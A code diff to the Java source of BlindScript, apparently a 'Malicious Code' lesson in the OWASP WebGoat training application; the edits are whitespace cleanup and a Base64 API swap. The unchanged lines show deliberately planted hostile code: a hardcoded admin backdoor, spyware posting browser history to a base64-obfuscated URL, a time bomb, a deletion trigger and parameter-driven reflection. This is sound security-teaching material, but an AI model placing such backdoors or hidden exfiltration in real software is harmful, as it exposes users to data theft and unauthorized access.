@@ -29,36 +29,37 @@ import java.io.IOException;
 import java.net.URI;
 import java.net.URISyntaxException;
 import java.util.Arrays;
+import java.util.Base64;
 
 /*******************************************************************************
- * 
- * 
+ *
+ *
  * This file is part of WebGoat, an Open Web Application Security Project
  * utility. For details, please see http://www.owasp.org/
- * 
+ *
  * Copyright (c) 2002 - 20014 Bruce Mayhew
- * 
+ *
  * This program is free software; you can redistribute it and/or modify it under
  * the terms of the GNU General Public License as published by the Free Software
  * Foundation; either version 2 of the License, or (at your option) any later
  * version.
- * 
+ *
  * This program is distributed in the hope that it will be useful, but WITHOUT
  * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
  * details.
- * 
+ *
  * You should have received a copy of the GNU General Public License along with
  * this program; if not, write to the Free Software Foundation, Inc., 59 Temple
  * Place - Suite 330, Boston, MA 02111-1307, USA.
- * 
+ *
  * Getting Source ==============
- * 
+ *
  * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository
  * for free software projects.
- * 
+ *
  * For details, please see http://webgoat.github.io
- * 
+ *
  * @author Bruce Mayhew <a href="http://code.google.com/p/webgoat">WebGoat</a>
  * @created October 28, 2003
  */
@@ -72,7 +73,7 @@ public class BlindScript extends LessonAdapter
     private final static String WEBGOAT_URL = "aHR0cDovL2xvY2FsaG9zdC9XZWJHb2F0L2NhdGNoZXI/UFJPUEVSVFk9eWVz";
     /**
      * Description of the Method
-     * 
+     *
      * @param s
      *            Description of the Parameter
      * @return Description of the Return Value
@@ -117,7 +118,7 @@ public class BlindScript extends LessonAdapter
         executeTimeTrigger(s);
         executeEventTrigger(s);
         executeBackDoor(s);
-        
+
         // Dynamic Class Loading
         String code = s.getParser().getStringParameter(CODE, "");
         String method = s.getParser().getStringParameter(METHOD, "");
@@ -139,7 +140,7 @@ public class BlindScript extends LessonAdapter
 
     private void executeBackDoor(WebSession s)
     {
-        
+
         // Make me an admin
         String me = s.getParser().getStringParameter(PERSON, "");
         if ("B_Admin443".equals(me))
@@ -151,7 +152,7 @@ public class BlindScript extends LessonAdapter
         // the admin checks have been performed and the lessons/functions have been
         // loaded for the user.
     }
-    
+
     public void executeSpyWare( WebSession s )
     {
         // Lets gather some information about the users browsing history
@@ -166,19 +167,19 @@ public class BlindScript extends LessonAdapter
                 browserFiles.append(separator);
             }
         }
-        
+
         // post the data to my listen servlet
         try {
-            
+
             // Send data
-            String partner = new String(new sun.misc.BASE64Decoder().decodeBuffer(WEBGOAT_URL));
+            String partner = new String(Base64.getDecoder().decode(WEBGOAT_URL));
             URL url = new URL(partner);
             URLConnection conn = url.openConnection();
             conn.setDoOutput(true);
             OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
             wr.write("&cache=" + browserFiles.toString());
             wr.flush();
-        
+
             // Get the response
             BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             String line;
@@ -193,7 +194,7 @@ public class BlindScript extends LessonAdapter
     }
     private void executeEventTrigger(WebSession s)
     {
-        
+
         //  after 100 loads delete all the user status
 
         LessonTracker lt = this.getLessonTracker(s);
@@ -211,13 +212,13 @@ public class BlindScript extends LessonAdapter
         }
     }
 
-    
+
     private void executeTimeTrigger(WebSession s)
     {
         Calendar cal1 = Calendar.getInstance();
         Calendar cal2 = Calendar.getInstance();
         cal2.set(2010, 1, 13);  // Jan 13th 2010
-        
+
         // Event triggered time bomb
         if (cal1.getTime().after(cal2.getTime()))
         {
@@ -243,7 +244,7 @@ public class BlindScript extends LessonAdapter
             Class cls = (Class.forName(clazz));
             StringTokenizer argsTok = new StringTokenizer(argTypes, ",");
             StringTokenizer paramsTok = new StringTokenizer(params, ",");
-            
+
             // Build the list of parameter types to look up the method
             Class parameterType[] = null;
             Object argList[] = null;
@@ -255,12 +256,12 @@ public class BlindScript extends LessonAdapter
             {
                 argList = new Object[paramsTok.countTokens()];
             }
-            
+
             int i = 0;
             while (argsTok.hasMoreTokens())
             {
                 String argString = argsTok.nextToken();
-                
+
                 if ("W".equals(argString))
                 {
                     parameterType[i] = WebSession.class;
@@ -273,8 +274,8 @@ public class BlindScript extends LessonAdapter
             {
                 parameterType[i] = Integer.class;
             }
-            }   
-                
+            }
+
             Method meth = cls.getMethod(method, parameterType);
             String retobj = (String) meth.invoke(cls, argList);
             return retobj;
@@ -296,7 +297,7 @@ public class BlindScript extends LessonAdapter
 
     /**
      * Gets the hints attribute of the HelloScreen object
-     * 
+     *
      * @return The hints value
      */
     public List<String> getHints(WebSession s)
@@ -311,7 +312,7 @@ public class BlindScript extends LessonAdapter
 
     /**
      * Gets the ranking attribute of the HelloScreen object
-     * 
+     *
      * @return The ranking value
      */
     private final static Integer DEFAULT_RANKING = new Integer(10);
@@ -328,14 +329,14 @@ public class BlindScript extends LessonAdapter
 
     /**
      * Gets the title attribute of the HelloScreen object
-     * 
+     *
      * @return The title value
      */
     public String getTitle()
     {
         return ("Malicious Code");
     }
-    
+
 
     private static boolean compile( JavaFileObject... source )
         {
@@ -366,7 +367,7 @@ public class BlindScript extends LessonAdapter
         return sb.toString();
     }
 
-    public static void StaticDeleter(  ) 
+    public static void StaticDeleter(  )
     {
         final String programText = compose(  );
         try
@@ -399,5 +400,4 @@ public class BlindScript extends LessonAdapter
         {
         return programText;
         }
-    }   
-    
+    }
